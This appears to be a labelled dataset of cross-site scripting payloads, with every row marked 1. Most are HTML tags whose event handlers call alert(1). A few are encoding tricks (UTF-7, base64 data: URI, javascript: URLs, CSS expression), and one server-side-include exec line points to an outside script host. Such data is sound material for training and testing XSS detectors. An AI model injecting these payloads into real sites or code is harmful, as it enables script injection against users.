1,"< dir onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /dir >"
1,< iframe onpointerover = alert ( 1 ) > XSS < /iframe >
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < map id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /map >"
1,< custom tags onpointerleave = alert ( 1 ) > XSS < /custom tags >
1,"< xmp draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /xmp >"
1,< textarea onbeforepaste = alert ( 1 ) autofocus > < /textarea >
1,< option onfocusout = alert ( 1 ) tabindex = 1 id = x > < /option > < input autofocus >
1,"< div draggable = ""true"" contenteditable > drag me < /div > < abbr ondrop = alert ( 1 ) contenteditable > drop here < /abbr >"
1,"< img oncopy = ""alert ( 1 ) "" contenteditable > test < /img >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < s ondragover = alert ( 1 ) contenteditable > drop here < /s >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < hr ondrop = alert ( 1 ) contenteditable > drop here < /hr >"
1,< ins id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /ins > < input id = y autofocus >
1,"< td draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /td >"
1,"< big oncopy = ""alert ( 1 ) "" contenteditable > test < /big >"
1,"< table onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /table >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < details ondrop = alert ( 1 ) contenteditable > drop here < /details >"
1,< hr onpointerenter = alert ( 1 ) > XSS < /hr >
1,"< nav oncut = ""alert ( 1 ) "" contenteditable > test < /nav >"
1,"< summary draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /summary >"
1,< data id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /data >
1,"< label onpaste = ""alert ( 1 ) "" contenteditable > test < /label >"
1,"< cite draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /cite >"
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < big id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /big >"
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < cite id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /cite >"
1,"< style > @keyframes slidein {} < /style > < aside style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /aside >"
1,"< style > @keyframes slidein {} < /style > < object style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /object >"
1,"< element onmouseout = ""alert ( 1 ) "" > test < /element >"
1,< ins id = x tabindex = 1 onfocusin = alert ( 1 ) > < /ins >
1,< input type = radio id = x onfocusin = alert ( 1 ) >
1,"< style > :target {color: red ; } < /style > < del id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /del >"
1,< nobr onpointerup = alert ( 1 ) > XSS < /nobr >
1,"< caption oncopy = ""alert ( 1 ) "" contenteditable > test < /caption >"
1,"< style > :target {color: red ; } < /style > < area id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /area >"
1,"< footer onmouseleave = ""alert ( 1 ) "" > test < /footer >"
1,"< button draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /button >"
1,< style id = x tabindex = 1 onfocus = alert ( 1 ) > < /style >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < track id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /track >"
1,< keygen id = x tabindex = 1 onactivate = alert ( 1 ) > < /keygen >
1,"< sub onkeydown = ""alert ( 1 ) "" contenteditable > test < /sub >"
1,< s onpointerdown = alert ( 1 ) > XSS < /s >
1,"< mark oncopy = ""alert ( 1 ) "" contenteditable > test < /mark >"
1,< var id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /var > < input id = y autofocus >
1,"< style > @keyframes x{} < /style > < a style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /a >"
1,< th id = x tabindex = 1 onfocusin = alert ( 1 ) > < /th >
1,"< progress ondblclick = ""alert ( 1 ) "" > test < /progress >"
1,"< xmp ondblclick = ""alert ( 1 ) "" > test < /xmp >"
1,< script onpointerout = alert ( 1 ) > XSS < /script >
1,"< optgroup onpaste = ""alert ( 1 ) "" contenteditable > test < /optgroup >"
1,"< frame onmousedown = ""alert ( 1 ) "" > test < /frame >"
1,"< style > @keyframes slidein {} < /style > < blink style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /blink >"
1,< s onpointerenter = alert ( 1 ) > XSS < /s >
1,< shadow onpointerup = alert ( 1 ) > XSS < /shadow >
1,"< table oncopy = ""alert ( 1 ) "" contenteditable > test < /table >"
1,"< img onmousemove = ""alert ( 1 ) "" > test < /img >"
1,"< img onmouseup = ""alert ( 1 ) "" > test < /img >"
1,"< style > :target {color:red ; } < /style > < object id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /object >"
1,< input onblur = alert ( 1 ) id = x > < input autofocus >
1,"< div draggable = ""true"" contenteditable > drag me < /div > < bdo ondrop = alert ( 1 ) contenteditable > drop here < /bdo >"
1,"< style > @keyframes x{} < /style > < font style = ""animation-name:x"" onanimationend = ""alert ( 1 ) "" > < /font >"
1,"< style > @keyframes slidein {} < /style > < var style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /var >"
1,"< object onpaste = ""alert ( 1 ) "" contenteditable > test < /object >"
1,"< style > :target {color: red ; } < /style > < html id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /html >"
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < dt id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /dt >"
1,"< var onbeforecut = ""alert ( 1 ) "" contenteditable > test < /var >"
1,"< style > @keyframes x{} < /style > < sup style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /sup >"
1,"< html onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /html >"
1,< frameset > < frame onload = alert ( 1 ) >
1,"< kbd onmouseout = ""alert ( 1 ) "" > test < /kbd >"
1,"< dir onmouseout = ""alert ( 1 ) "" > test < /dir >"
1,"< style > @keyframes slidein {} < /style > < xmp style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /xmp >"
1,< dfn id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /dfn >
1,"< HEAD > < META HTTP-EQUIV = ""CONTENT-TYPE"" CONTENT = ""text/html ; charset = UTF-7"" > < /HEAD > +ADw-SCRIPT+AD4-alert ( '' ) ; +ADw-/SCRIPT+AD4-"
1,"< style > :target {color: red ; } < /style > < ruby id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /ruby >"
1,"< style > @keyframes slidein {} < /style > < nextid style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /nextid >"
1,"< q onmouseover = ""alert ( 1 ) "" > test < /q >"
1,< bgsound onpointerout = alert ( 1 ) > XSS < /bgsound >
1,< frameset id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /frameset > < input id = y autofocus >
1,"< ol onpaste = ""alert ( 1 ) "" contenteditable > test < /ol >"
1,< fieldset id = x tabindex = 1 onactivate = alert ( 1 ) > < /fieldset >
1,"< a onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /a >"
1,"< image onpaste = ""alert ( 1 ) "" contenteditable > test < /image >"
1,< base id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /base >
1,"< div draggable = ""true"" contenteditable > drag me < /div > < label ondrop = alert ( 1 ) contenteditable > drop here < /label >"
1,"< dir onbeforecut = ""alert ( 1 ) "" contenteditable > test < /dir >"
1,"< form draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /form >"
1,< dl onpointerenter = alert ( 1 ) > XSS < /dl >
1,"< dialog onmouseout = ""alert ( 1 ) "" > test < /dialog >"
1,< data onpointerenter = alert ( 1 ) > XSS < /data >
1,"< blink onkeypress = ""alert ( 1 ) "" contenteditable > test < /blink >"
1,"< frame onmouseover = ""alert ( 1 ) "" > test < /frame >"
1,"< style > :target {color:red ; } < /style > < a id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /a >"
1,"< select oncut = ""alert ( 1 ) "" contenteditable > test < /select >"
1,< th onblur = alert ( 1 ) tabindex = 1 id = x > < /th > < input autofocus >
1,"< ol draggable = ""true"" ondragenter = ""alert ( 1 ) "" > test < /ol >"
1,"< tbody onkeydown = ""alert ( 1 ) "" contenteditable > test < /tbody >"
1,< discard onpointerup = alert ( 1 ) > XSS < /discard >
1,< big id = x tabindex = 1 onfocus = alert ( 1 ) > < /big >
1,"/?param = < data:text/html ; base64 , PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4 ="
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < bgsound id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /bgsound >"
1,"< style > :target {color:red ; } < /style > < mark id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /mark >"
1,"< th onbeforecut = ""alert ( 1 ) "" contenteditable > test < /th >"
1,< li id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /li > < input id = y autofocus >
1,"SRC = ""test.xml"" ID = I"
1,< summary onfocusout = alert ( 1 ) tabindex = 1 id = x > < /summary > < input autofocus >
1,"< image draggable = ""true"" ondragstart = ""alert ( 1 ) "" > test < /image >"
1,"< small oncut = ""alert ( 1 ) "" contenteditable > test < /small >"
1,"< style > @keyframes x{} < /style > < keygen style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /keygen >"
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < menu id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /menu >"
1,"< legend draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /legend >"
1,"< header onclick = ""alert ( 1 ) "" > test < /header >"
1,< dir onpointerup = alert ( 1 ) > XSS < /dir >
1,< p id = x tabindex = 1 onactivate = alert ( 1 ) > < /p >
1,< code onblur = alert ( 1 ) tabindex = 1 id = x > < /code > < input autofocus >
1,"< figure onkeypress = ""alert ( 1 ) "" contenteditable > test < /figure >"
1,"< noscript onmouseover = ""alert ( 1 ) "" > test < /noscript >"
1,< a id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /a > < input autofocus >
1,< optgroup id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /optgroup > < input id = y autofocus >
1,"< canvas draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /canvas >"
1,"< canvas oncut = ""alert ( 1 ) "" contenteditable > test < /canvas >"
1,< option id = x tabindex = 1 onfocusin = alert ( 1 ) > < /option >
1,< image id = x tabindex = 1 onfocusin = alert ( 1 ) > < /image >
1,"< body draggable = ""true"" ondragend = ""alert ( 1 ) "" > test < /body >"
1,< li id = x tabindex = 1 onactivate = alert ( 1 ) > < /li >
1,< picture id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /picture > < input autofocus >
1,"< dfn onclick = ""alert ( 1 ) "" > test < /dfn >"
1,"< style > @keyframes x{} < /style > < script style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /script >"
1,< aside onpointerenter = alert ( 1 ) > XSS < /aside >
1,url ( javascript:alert ( '' )
1,< aside onpointerout = alert ( 1 ) > XSS < /aside >
1,"< blink onmouseenter = ""alert ( 1 ) "" > test < /blink >"
1,< form id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /form > < input id = y autofocus >
1,"< canvas onmouseover = ""alert ( 1 ) "" > test < /canvas >"
1,< svg > < xss onload = alert ( 1 ) > < /xss >
1,"< keygen onmousedown = ""alert ( 1 ) "" > test < /keygen >"
1,"< sup onmouseup = ""alert ( 1 ) "" > test < /sup >"
1,< rt onpointerleave = alert ( 1 ) > XSS < /rt >
1,"< area onkeydown = ""alert ( 1 ) "" contenteditable > test < /area >"
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < xss id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /xss >"
1,< strong onpointerleave = alert ( 1 ) > XSS < /strong >
1,"< q oncut = ""alert ( 1 ) "" contenteditable > test < /q >"
1,"< aside oncopy = ""alert ( 1 ) "" contenteditable > test < /aside >"
1,"< applet oncontextmenu = ""alert ( 1 ) "" > test < /applet >"
1,"< big draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /big >"
1,"< aside onmouseover = ""alert ( 1 ) "" > test < /aside >"
1,"< style > @keyframes x{} < /style > < template style = ""animation-name:x"" onanimationend = ""alert ( 1 ) "" > < /template >"
1,"< embed onmousedown = ""alert ( 1 ) "" > test < /embed >"
1,"< del draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /del >"
1,"< style > :target {color: red ; } < /style > < element id = x style = ""transition:color 10s"" ontransitioncancel = alert ( 1 ) > < /element >"
1,"< div oncontextmenu = ""alert ( 1 ) "" > test < /div >"
1,< main id = x tabindex = 1 onactivate = alert ( 1 ) > < /main >
1,< caption onpointermove = alert ( 1 ) > XSS < /caption >
1,"< spacer onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /spacer >"
1,"< element onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /element >"
1,< figcaption id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /figcaption > < input id = y autofocus >
1,"< mark onmouseover = ""alert ( 1 ) "" > test < /mark >"
1,< menuitem onpointerdown = alert ( 1 ) > XSS < /menuitem >
1,"< kbd onmouseup = ""alert ( 1 ) "" > test < /kbd >"
1,< div id = x tabindex = 1 ondeactivate = alert ( 1 ) > < /div > < input id = y autofocus >
1,"< div draggable = ""true"" contenteditable > drag me < /div > < map ondragover = alert ( 1 ) contenteditable > drop here < /map >"
1,"< multicol draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /multicol >"
1,"< samp draggable = ""true"" ondragleave = ""alert ( 1 ) "" > test < /samp >"
1,"< style > @keyframes slidein {} < /style > < progress style = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" onanimationiteration = ""alert ( 1 ) "" > < /progress >"
1,< audio id = x tabindex = 1 onbeforedeactivate = alert ( 1 ) > < /audio > < input autofocus >
1,"< noembed onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /noembed >"
1,"document.getElementsByClassName ( """" ) .length"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < col ondragover = alert ( 1 ) contenteditable > drop here < /col >"
1,"< hr oncut = ""alert ( 1 ) "" contenteditable > test < /hr >"
1,< body onpointerenter = alert ( 1 ) > XSS < /body >
1,"< listing ondblclick = ""alert ( 1 ) "" > test < /listing >"
1,"< head onbeforecopy = ""alert ( 1 ) "" contenteditable > test < /head >"
1,"< div draggable = ""true"" contenteditable > drag me < /div > < kbd ondragover = alert ( 1 ) contenteditable > drop here < /kbd >"
1,"< output onclick = ""alert ( 1 ) "" > test < /output >"
1,"< footer draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /footer >"
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < b id = x style = ""position:absolute ; "" onanimationcancel = ""alert ( 1 ) "" > < /b >"
1,"< menuitem ondblclick = ""alert ( 1 ) "" > test < /menuitem >"
1,"< multicol onkeyup = ""alert ( 1 ) "" contenteditable > test < /multicol >"
1,< figcaption onpointerout = alert ( 1 ) > XSS < /figcaption >
1,"< applet draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /applet >"
1,< label id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /label >
1,"< aside onkeypress = ""alert ( 1 ) "" contenteditable > test < /aside >"
1,"< link draggable = ""true"" ondragend = ""alert ( 1 ) "" > test < /link >"
1,"< multicol draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /multicol >"
1,"< hgroup onmouseenter = ""alert ( 1 ) "" > test < /hgroup >"
1,"< !--#exec cmd = ""/bin/echo 'IPT SRC = http://.rocks/.js >"
1,":ex/**//*/*/pression ( alert ( """" ) ) ' >"
1,"< style > :target {transform: rotate ( 180deg ) ; } < /style > < option id = x style = ""transition:transform 2s"" ontransitionrun = alert ( 1 ) > < /option >"
1,"< canvas draggable = ""true"" ondrag = ""alert ( 1 ) "" > test < /canvas >"
1,"< p ondblclick = ""alert ( 1 ) "" > test < /p >"
1,"< fieldset onmouseup = ""alert ( 1 ) "" > test < /fieldset >"
1,< wbr id = x tabindex = 1 onfocusin = alert ( 1 ) > < /wbr >
1,"< basefont ondblclick = ""alert ( 1 ) "" > test < /basefont >"
1,"< style > :target {color:red ; } < /style > < optgroup id = x style = ""transition:color 1s"" ontransitionend = alert ( 1 ) > < /optgroup >"
1,"< small onkeyup = ""alert ( 1 ) "" contenteditable > test < /small >"
1,"< label oncopy = ""alert ( 1 ) "" contenteditable > test < /label >"
1,"< object onbeforepaste = ""alert ( 1 ) "" contenteditable > test < /object >"
1,"< noembed onbeforecut = ""alert ( 1 ) "" contenteditable > test < /noembed >"
1,< samp id = x tabindex = 1 onbeforeactivate = alert ( 1 ) > < /samp >
1,"< style > @keyframes x{} < /style > < menuitem style = ""animation-name:x"" onanimationstart = ""alert ( 1 ) "" > < /menuitem >"
1,"< dfn onmouseover = ""alert ( 1 ) "" > test < /dfn >"
1,< th onfocusout = alert ( 1 ) tabindex = 1 id = x > < /th > < input autofocus >
1,< b id = x tabindex = 1 onfocusin = alert ( 1 ) > < /b >
1,"< multicol oncopy = ""alert ( 1 ) "" contenteditable > test < /multicol >"
1,"< sub onmousedown = ""alert ( 1 ) "" > test < /sub >"
1,< h1 onpointerleave = alert ( 1 ) > XSS < /h1 >
